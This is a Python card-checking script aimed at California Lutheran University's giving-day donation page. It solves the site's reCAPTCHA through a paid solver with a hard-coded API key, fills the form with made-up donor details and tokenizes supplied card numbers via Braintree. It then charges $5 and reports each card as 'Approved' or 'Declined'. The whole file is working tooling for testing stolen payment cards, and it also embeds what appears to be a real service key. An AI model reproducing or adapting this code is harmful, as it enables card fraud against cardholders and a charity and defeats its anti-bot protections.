import requests
import base64
import random
import string
import capsolver
import asyncio
from httpx import AsyncClient

def random_email():

    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    domains = ['@gmail.com', '@hotmail.com']
    return name + random.choice(domains)


async def b3ccn(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as web:
        email = random_email()
        
        capsolver.api_key = "CAP-5D246BDACA192D1EAC3F1494BE61BA77"
            
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV3TaskProxyLess",
        "websiteKey": '6LdxMfIhAAAAANdZyHFAnV5G1aKvGwLOOobRmxQi',
        "websiteURL": 'https://give.callutheran.edu/',
        })))['gRecaptchaResponse']
        
        req1 = await web.get('https://give.callutheran.edu/giving-day/94746/donate?dept=94748')



        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'lead_id=ePdTclfQ9FEW0IKDhIIOh515; _ga=GA1.1.1387658695.1733105612; _ga=GA1.3.1387658695.1733105612; _gid=GA1.3.148966994.1733105612; sfss_=b8e36e65028057fd18fa83d748bcb376ff0aa55egAJ9cQAoWAMAAABfaWRxAVggAAAAZDFkZjYxMjRlODNjNGMzMWJiYWIzZmJhMjQyZWFlMmZxAlgOAAAAX2NyZWF0aW9uX3RpbWVxA0dB2dNF8mGA8VgOAAAAX2FjY2Vzc2VkX3RpbWVxBEdB2dNILu76e1gIAAAAX2V4cGlyZXNxBWNkYXRldGltZQpkYXRldGltZQpxBmNfY29kZWNzCmVuY29kZQpxB1gNAAAAB8OpAwwCMjMCw6bDn3EIWAYAAABsYXRpbjFxCYZxClJxC4VxDFJxDXUu; _ga_RV5VRTSTD8=GS1.3.1733107853.2.1.1733107901.0.0.0; _ga_M0Z6C2W850=GS1.1.1733105611.1.1.1733107939.0.0.0; _ga_4WGDXMXYNH=GS1.1.1733105611.1.1.1733107951.0.0.0; _ga_X5P02F0DF1=GS1.1.1733105611.1.1.1733107951.0.0.0',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjcwODE3NSIsImFwIjoiMTEyMDA0NzE5NiIsImlkIjoiZGNjZWUyZGZhM2I4NzAwNCIsInRyIjoiMTQwMGJlOTQ3ZTY1Y2M0YWFkYmZkMjcyNzBiN2ZkYjYiLCJ0aSI6MTczMzEwNzk1MTI0Mn19',
            'origin': 'https://give.callutheran.edu',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://give.callutheran.edu/giving-day/94746/donate?dept=94748',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'traceparent': '00-1400be947e65cc4aadbfd27270b7fdb6-dccee2dfa3b87004-01',
            'tracestate': '708175@nr=0-1-708175-1120047196-dccee2dfa3b87004----1733107951242',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-newrelic-id': 'UwYPUFFWGwIAU1RSAwYEUlU=',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'lineitem-0DfundSelect': '',
            'lineitem-0Dgroup2': '94748',
            'lineitem-0Dgroup': '94748',
            'lineitem-0Ddesignation': '640712',
            'lineitem-0Dother_designation_name': '',
            'lineitem-0Damount': '5',
            'email': 'scarlatmario4@tiktok.tf',
            'first_name': 'Sebastian',
            'last_name': 'Gutierrez',
            'country': 'US',
            'address': '103-105 Central Ave',
            'address2': '',
            'city': 'Orange',
            'state': 'NJ',
            'zipcode': '07050-3824',
            'comments': 'lfj55',
            'phone': '15059947000',
            '18603': '46356',
            'in_memorium': 'in-none',
            'in_memorium_name': '',
            'honoree_email': '',
            'anon_don': '1',
            'ga4_cid': '1387658695.1733105612',
            'device_type': 'Mobile',
            'ga_recaptcha': g_response,
            'lead_id': 'ePdTclfQ9FEW0IKDhIIOh515',
            'payment_type': 'web',
            'group_set_id': 'None',
        }

        req2 = await web.post('https://give.callutheran.edu/gd-prep-donation', headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'lead_id=ePdTclfQ9FEW0IKDhIIOh515; _ga=GA1.1.1387658695.1733105612; _ga=GA1.3.1387658695.1733105612; _gid=GA1.3.148966994.1733105612; _gat_UA-123836-36=1; sfss_=b91713c103641fe88ede3f75c88ecac08043a775gAJ9cQAoWAMAAABfaWRxAVggAAAAZDFkZjYxMjRlODNjNGMzMWJiYWIzZmJhMjQyZWFlMmZxAlgOAAAAX2NyZWF0aW9uX3RpbWVxA0dB2dNF8mGA8VgOAAAAX2FjY2Vzc2VkX3RpbWVxBEdB2dNId8pPUVgIAAAAX2V4cGlyZXNxBWNkYXRldGltZQpkYXRldGltZQpxBmNfY29kZWNzCmVuY29kZQpxB1gNAAAAB8OpAwwCMjMCw6bDn3EIWAYAAABsYXRpbjFxCYZxClJxC4VxDFJxDXUu; _ga_RV5VRTSTD8=GS1.3.1733107853.2.1.1733108193.0.0.0; _ga_4WGDXMXYNH=GS1.1.1733105611.1.1.1733108213.0.0.0; _ga_M0Z6C2W850=GS1.1.1733105611.1.1.1733108213.0.0.0; _ga_X5P02F0DF1=GS1.1.1733105611.1.1.1733108213.0.0.0',
            'origin': 'https://give.callutheran.edu',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://give.callutheran.edu/giving-day/94746/donate',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'order_id': '44704a7a2e4d6c7a77496e61',
            'merchant_account_id': 'californialutheranuniversity_instant',
            'amount': '5.00',
            'cancel_url': 'https://give.callutheran.edu/giving-day/94746/donate?don_msg=cancel&utm_nooverride=1',
            'thanks_url': 'https://give.callutheran.edu/giving-day/94746/thanks?atid=5369581&utm_nooverride=1',
            'order_description': 'Giving Tuesday 2024',
            'first_name': 'Sebastian',
            'last_name': 'Gutierrez',
            'street_address': '103-105 Central Ave',
            'extended_address': '',
            'email': 'scarlatmario4@tiktok.tf',
            'phone': '15059947000',
            'locality': 'Orange',
            'region': 'NJ',
            'postal_code': '07050-3824',
            'country_code_alpha2': 'US',
            'line_items': '5.00,UNRESTAF',
            'enable_venmo': 'true',
            'enable_paypal': 'true',
            'merchant_id': '5j8rz3d8mfffj8yr',
            'x_amount': '5.00',
            'ip_address': '2806:1016:8:baa3:4976:c7c3:6269:89c8',
            'module_id': '94746',
            'module_type': 'givingdays',
            'sf_trans_id': '5369581',
            'sf_payment_type': 'donation',
            'sf_don_id': '44704a7a2e4d6c7a77496e61',
            'sf_amount': '5',
            'sf_sys_code': 'bt',
        }

        req3 = await web.post('https://give.callutheran.edu/pmt/braintree', headers=headers, data=data)
        authorization = req3.text.split('braintree.client.create({')[1].split('authorization: "')[1].split('"')[0]
        decodeclient = base64.b64decode(authorization).decode('utf-8')

        authorizationFingerprint = decodeclient.split('"authorizationFingerprint":"')[1].split('"')[0]
        
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'authorization': 'Bearer ' + authorizationFingerprint,
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://give.callutheran.edu',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://give.callutheran.edu/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '74a3caca-5693-4cbb-86c8-f1e6073b21d3',
            },
            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }

        req3 = await web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'authorization': 'Bearer ' + authorizationFingerprint,
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '74a3caca-5693-4cbb-86c8-f1e6073b21d3',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        #'cvv': '999',
                        'billingAddress': {
                            'postalCode': '10010',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        req4 = await web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tokencc = req4.json()['data']['tokenizeCreditCard']['token']

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'lead_id=ePdTclfQ9FEW0IKDhIIOh515; _ga=GA1.1.1387658695.1733105612; _ga=GA1.3.1387658695.1733105612; _gid=GA1.3.148966994.1733105612; sfss_=b91713c103641fe88ede3f75c88ecac08043a775gAJ9cQAoWAMAAABfaWRxAVggAAAAZDFkZjYxMjRlODNjNGMzMWJiYWIzZmJhMjQyZWFlMmZxAlgOAAAAX2NyZWF0aW9uX3RpbWVxA0dB2dNF8mGA8VgOAAAAX2FjY2Vzc2VkX3RpbWVxBEdB2dNId8pPUVgIAAAAX2V4cGlyZXNxBWNkYXRldGltZQpkYXRldGltZQpxBmNfY29kZWNzCmVuY29kZQpxB1gNAAAAB8OpAwwCMjMCw6bDn3EIWAYAAABsYXRpbjFxCYZxClJxC4VxDFJxDXUu; _ga_RV5VRTSTD8=GS1.3.1733107853.2.1.1733108193.0.0.0; _ga_4WGDXMXYNH=GS1.1.1733105611.1.1.1733108213.0.0.0; _ga_M0Z6C2W850=GS1.1.1733105611.1.1.1733108213.0.0.0; _ga_X5P02F0DF1=GS1.1.1733105611.1.1.1733108213.0.0.0',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjcwODE3NSIsImFwIjoiMTEyMDA0NzE5NiIsImlkIjoiN2E0NTdlN2M1ZmUxMmJjYSIsInRyIjoiMDFmYWFjZmVlNWVmZTUzNDMyNjY5YmEzYjY3YzZmZmIiLCJ0aSI6MTczMzEwODY4OTI3MX19',
            'origin': 'https://give.callutheran.edu',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://give.callutheran.edu/pmt/braintree',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-newrelic-id': 'UwYPUFFWGwIAU1RSAwYEUlU=',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'order_id': '44704a7a2e4d6c7a77496e61',
            'merchant_account_id': 'californialutheranuniversity_instant',
            'amount': '5.00',
            'cancel_url': 'https://give.callutheran.edu/giving-day/94746/donate?don_msg=cancel&amp;utm_nooverride=1',
            'thanks_url': 'https://give.callutheran.edu/giving-day/94746/thanks?atid=5369581&amp;utm_nooverride=1',
            'order_description': 'Giving Tuesday 2024',
            'first_name': 'Sebastian',
            'last_name': 'Gutierrez',
            'street_address': '103-105 Central Ave',
            'extended_address': '',
            'email': 'scarlatmario4@tiktok.tf',
            'phone': '15059947000',
            'locality': 'Orange',
            'region': 'NJ',
            'postal_code': '07050-3824',
            'country_code_alpha2': 'US',
            'line_items': '5.00,UNRESTAF',
            'enable_venmo': 'true',
            'enable_paypal': 'true',
            'merchant_id': '5j8rz3d8mfffj8yr',
            'x_amount': '5.00',
            'ip_address': '2806:1016:8:baa3:4976:c7c3:6269:89c8',
            'module_id': '94746',
            'module_type': 'givingdays',
            'sf_trans_id': '5369581',
            'sf_payment_type': 'donation',
            'sf_don_id': '44704a7a2e4d6c7a77496e61',
            'sf_amount': '5',
            'sf_sys_code': 'bt',
            'nonce': tokencc,
            'device_data': '{"device_session_id":"ce4fba2499a6fb40a8b8bd68b8353c56","fraud_merchant_id":null,"correlation_id":"947a4d632f657906546e957adebb8b4f"}',
            'ga_recaptcha': g_response,
        }

        req5 = await web.post('https://give.callutheran.edu/pmt/braintree_transaction', headers=headers, data=data)
        print(req5.text)
        if '"is_success": true' in req5.text:
            status = "Approved ✅"
            mensaje = "Charged 5$"
        else:
            mensaje = req5.json()['processor_response']
            if "avs" in mensaje or "Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        
        return status, mensaje
